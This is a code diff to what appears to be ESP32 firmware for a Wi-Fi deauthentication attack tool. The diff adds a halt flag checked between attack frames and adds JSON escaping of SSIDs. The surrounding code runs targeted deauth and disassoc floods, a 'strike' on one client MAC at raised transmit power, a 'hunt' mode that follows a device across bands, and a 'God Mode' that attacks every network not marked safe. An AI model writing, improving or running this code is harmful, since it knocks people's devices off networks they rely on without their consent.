@@ -49,10 +49,13 @@ static volatile int s_busy = 0;
 static volatile uint32_t s_rate = 0;
 
 #define TARGET_BURST          64    // deauth + disassoc frames per AP per cycle
-#define WINDOW_EVERY          6     // reconnect window once every N attack cycles
-#define CTRL_WINDOW_MS        500   // length of that reconnect window
 
 #define GOD_REFRESH_US 45000000ULL   // re-scan targets every 45s in God Mode
+
+// Halt gate: set when any control path needs to rewrite attack state. blast()
+// checks it between frames, so a running burst stops within one frame instead
+// of running on for tens of ms past s_mode = MODE_IDLE.
+static volatile bool s_halt_req = false;
 
 static void attack_task(void *arg)
 {
@@ -219,6 +222,7 @@ uint32_t control_rate(void) { return s_rate; }
 
 void control_init(void)
 {
+    deauth_set_gate(&s_halt_req);
     xTaskCreate(attack_task, "attack", 4096, NULL, 4, NULL);
     xTaskCreate(stats_task,  "stats",  3072, NULL, 3, NULL);
 }
@@ -263,13 +267,41 @@ static const char *auth_str(uint8_t a)
     }
 }
 
-// Append helper that tracks the ACTUAL end of the buffer content. snprintf's
-// return value is the desired (untruncated) length, so accumulating it directly
-// can push the write offset past `cap`; clamping here keeps pos <= strlen(out).
-#define JSON_APPEND(pos, cap, ...) do { \
-    if ((pos) < (cap) - 1) { \
-        int w_ = snprintf((out) + (pos), (cap) - (pos), __VA_ARGS__); \
-        if (w_ > 0) (pos) += (w_ > (cap) - 1 - (pos)) ? (cap) - 1 - (pos) : w_; \
+// Escape a string for use inside a JSON string literal (SSIDs are attacker-
+// controlled in this environment: they may contain quotes, backslashes or
+// control bytes that would otherwise break the JSON).
+static int json_escape(const char *in, char *out, int cap)
+{
+    int o = 0;
+    for (; *in && o < cap - 1; in++) {
+        unsigned char ch = (unsigned char)*in;
+        if (ch == '"' || ch == '\\') {
+            if (o > cap - 3) break;
+            out[o++] = '\\';
+            out[o++] = (char)ch;
+        } else if (ch < 0x20) {
+            if (o > cap - 7) break;
+            o += snprintf(out + o, cap - o, "\\u%04x", ch);
+        } else {
+            out[o++] = (char)ch;
+        }
+    }
+    out[o] = '\0';
+    return o;
+}
+
+// Serialize one entry into row[], then copy it into out ONLY if it fits whole.
+// Guarantees the emitted array is always valid JSON: no half-written entries,
+// and room is always reserved for the closing ']'.
+#define JSON_EMIT(len, cap, rowbuf, ...) do { \
+    int w_ = snprintf(rowbuf, sizeof(rowbuf), __VA_ARGS__); \
+    if (w_ > 0 && (size_t)w_ >= sizeof(rowbuf)) { \
+        w_ = sizeof(rowbuf) - 1; \
+        rowbuf[w_] = '\0'; \
+    } \
+    if (w_ > 0 && (len) + w_ <= (cap) - 2) { \
+        memcpy((out) + (len), rowbuf, w_); \
+        (len) += w_; \
     } \
 } while (0)
 
@@ -277,13 +309,17 @@ int control_list_json(char *out, int cap)
 {
     const wifi_network_t *nets = NULL;
     int n = wifi_get_networks(&nets);
+    char ssid_esc[2 * 32 + 1];
+    char row[512];
     int len = snprintf(out, cap, "[");
     for (int i = 0; i < n; i++) {
-        JSON_APPEND(len, cap,
+        json_escape(nets[i].ssid[0] ? nets[i].ssid : "(hidden)",
+                    ssid_esc, sizeof(ssid_esc));
+        JSON_EMIT(len, cap, row,
             "%s{\"i\":%d,\"ssid\":\"%s\",\"band\":\"%s\",\"ch\":%u,\"rssi\":%d,"
             "\"prot\":%s,\"safe\":%s,\"sec\":\"%s\",\"clients\":%u,\"tx\":%lu,\"bssid\":\"%02x:%02x:%02x:%02x:%02x:%02x\"}",
             i ? "," : "", i,
-            nets[i].ssid[0] ? nets[i].ssid : "(hidden)",
+            ssid_esc,
             nets[i].is_5ghz ? "5G" : "2.4G", nets[i].channel, nets[i].rssi,
             nets[i].prot ? "true" : "false",
             nets[i].safe ? "true" : "false",
@@ -292,43 +328,26 @@ int control_list_json(char *out, int cap)
             nets[i].bssid[0], nets[i].bssid[1], nets[i].bssid[2],
             nets[i].bssid[3], nets[i].bssid[4], nets[i].bssid[5]);
     }
-    JSON_APPEND(len, cap, "]");
+    len += snprintf(out + len, cap - len, "]");
     return len;
-}
-
-void control_print_table(void)
-{
-    const wifi_network_t *nets = NULL;
-    int n = wifi_get_networks(&nets);
-    printf("\n idx band ch   rssi  security dev    tx      bssid              ssid\n");
-    printf(" -----------------------------------------------------------------------------\n");
-    for (int i = 0; i < n; i++) {
-        printf("%4d %-4s %3u  %4d  %-8s %3u %7lu  %02x:%02x:%02x:%02x:%02x:%02x  %s%s%s\n",
-               i, nets[i].is_5ghz ? "5G" : "2.4G", nets[i].channel, nets[i].rssi,
-               auth_str(nets[i].auth), nets[i].clients, (unsigned long)nets[i].tx,
-               nets[i].bssid[0], nets[i].bssid[1], nets[i].bssid[2],
-               nets[i].bssid[3], nets[i].bssid[4], nets[i].bssid[5],
-               nets[i].ssid[0] ? nets[i].ssid : "(hidden)",
-               nets[i].prot ? " [PMF]" : "", nets[i].safe ? " [SAFE]" : "");
-    }
-    printf(" %d networks (PMF = deauth-immune, SAFE = protected from God Mode)\n\n", n);
 }
 
 int control_devices_json(int idx, char *out, int cap)
 {
     wifi_client_t cl[WIFI_MAX_CLIENTS];
     int c = wifi_get_clients(idx, cl, WIFI_MAX_CLIENTS);
+    char row[160];
     int len = snprintf(out, cap, "[");
     for (int i = 0; i < c; i++) {
         bool priv = cl[i].mac[0] & 0x02;   // locally-administered = randomized
-        JSON_APPEND(len, cap,
+        JSON_EMIT(len, cap, row,
             "%s{\"mac\":\"%02x:%02x:%02x:%02x:%02x:%02x\",\"rssi\":%d,\"pkts\":%u,\"priv\":%s}",
             i ? "," : "",
             cl[i].mac[0], cl[i].mac[1], cl[i].mac[2],
             cl[i].mac[3], cl[i].mac[4], cl[i].mac[5],
             cl[i].rssi, cl[i].pkts, priv ? "true" : "false");
     }
-    JSON_APPEND(len, cap, "]");
+    len += snprintf(out + len, cap - len, "]");
     return len;
 }
 
@@ -346,8 +365,9 @@ int control_attack_selection(const int *idx, int n)
     int have = wifi_get_networks(&nets);
     int k = 0;
     // Halt any running attack FIRST: the attack task reads s_sel[] every cycle,
-    // and we're about to overwrite it (re-arming mid-attack would otherwise feed
-    // it torn wifi_network_t snapshots).
+    // and we're about to overwrite it. The halt gate makes any in-flight blast
+    // stop within one frame.
+    s_halt_req = true;
     s_mode = MODE_IDLE;
     vTaskDelay(pdMS_TO_TICKS(5));   // let the current iteration observe the stop
     for (int i = 0; i < n && k < WIFI_MAX_NETWORKS; i++) {
@@ -365,6 +385,7 @@ int control_attack_selection(const int *idx, int n)
         wifi_sniff_channel(s_sel[i].channel, s_sel[i].is_5ghz, 2500);
 
     s_mode = MODE_TARGET;
+    s_halt_req = false;
     ESP_LOGW(TAG, "TARGET deauth on %d AP(s) @ full rate (directed + broadcast)", k);
     return k;
 }
@@ -372,7 +393,8 @@ int control_attack_selection(const int *idx, int n)
 int control_strike(uint8_t ch, int is5, const uint8_t bssid[6], const uint8_t mac[6])
 {
     if (!bssid || !mac || ch == 0) return -1;
-    s_mode = MODE_IDLE;             // halt the loop before rewriting its targets
+    s_halt_req = true;              // halt the loop before rewriting its targets
+    s_mode = MODE_IDLE;
     vTaskDelay(pdMS_TO_TICKS(5));
     memcpy(s_strike_bssid, bssid, 6);
     memcpy(s_strike_mac,   mac,   6);
@@ -392,6 +414,7 @@ int control_strike(uint8_t ch, int is5, const uint8_t bssid[6], const uint8_t ma
     esp_wifi_set_max_tx_power(84);
     ESP_LOGW(TAG, "STRIKE %02x:%02x:%02x:%02x:%02x:%02x on ch%u %s (directed, parked)",
              mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], ch, is5 ? "5G" : "2.4G");
+    s_halt_req = false;
     s_mode = MODE_STRIKE;
     return 0;
 }
@@ -400,7 +423,8 @@ int control_hunt(const uint8_t mac[6], const uint8_t (*bssids)[6],
                  const uint8_t *chans, const int *is5, int n)
 {
     if (!mac || n <= 0 || n > 4) return -1;
-    s_mode = MODE_IDLE;             // halt the loop before rewriting its targets
+    s_halt_req = true;              // halt the loop before rewriting its targets
+    s_mode = MODE_IDLE;
     vTaskDelay(pdMS_TO_TICKS(5));
     memcpy(s_hunt_mac, mac, 6);
     for (int i = 0; i < n; i++) {
@@ -412,19 +436,25 @@ int control_hunt(const uint8_t mac[6], const uint8_t (*bssids)[6],
     esp_wifi_set_mode(WIFI_MODE_AP);   // AP-only: give the whole radio to injection
     ESP_LOGW(TAG, "HUNT %02x:%02x:%02x:%02x:%02x:%02x across %d band(s), %dms/band",
              mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], n, (int)(HUNT_DWELL_US/1000));
+    s_halt_req = false;
     s_mode = MODE_HUNT;
     return n;
 }
 
 void control_god(void)
 {
+    s_halt_req = true;
+    s_mode = MODE_IDLE;
+    vTaskDelay(pdMS_TO_TICKS(5));   // let any running attack observe the stop
     esp_wifi_set_mode(WIFI_MODE_APSTA);   // strike/hunt drop STA; God's refresh scan needs it
     god_mode_start();
+    s_halt_req = false;
     s_mode = MODE_GOD;
 }
 
 void control_stop(void)
 {
+    s_halt_req = true;              // close the TX gate for good until rearmed
     s_mode = MODE_IDLE;
     god_mode_stop();
     wifi_promisc_discovery(false);
